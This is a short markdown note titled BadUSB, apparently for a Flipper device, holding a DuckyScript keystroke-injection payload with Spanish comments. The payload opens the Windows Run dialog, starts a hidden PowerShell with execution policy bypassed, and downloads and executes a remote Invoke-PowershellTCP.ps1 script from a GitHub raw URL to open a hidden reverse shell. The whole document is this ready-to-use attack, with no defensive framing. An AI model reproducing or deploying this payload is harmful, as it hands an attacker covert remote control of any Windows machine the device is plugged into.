# BadUSB

* [Flipper-Tools](https://github.com/UberGuidoZ/Flipper)

```bash 
REM Description: Abrir powershell y crea una reverse shell oculta
REM Target: Windows 10 (CMD, Powershell)
REM Version: 1.0
REM Category: Acceso Remoto
REM --> Utilizando IEX para realizar un GET por medio de la memoria comunicarse con nuestra ReverseShell.ps1

DELAY 300
GUI r
DELAY 20
STRING powershell -w h -NoP -NonI -Ep Bypass IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Omar/Scripts/main/Invoke-PowershellTCP.ps1');
ENTER
```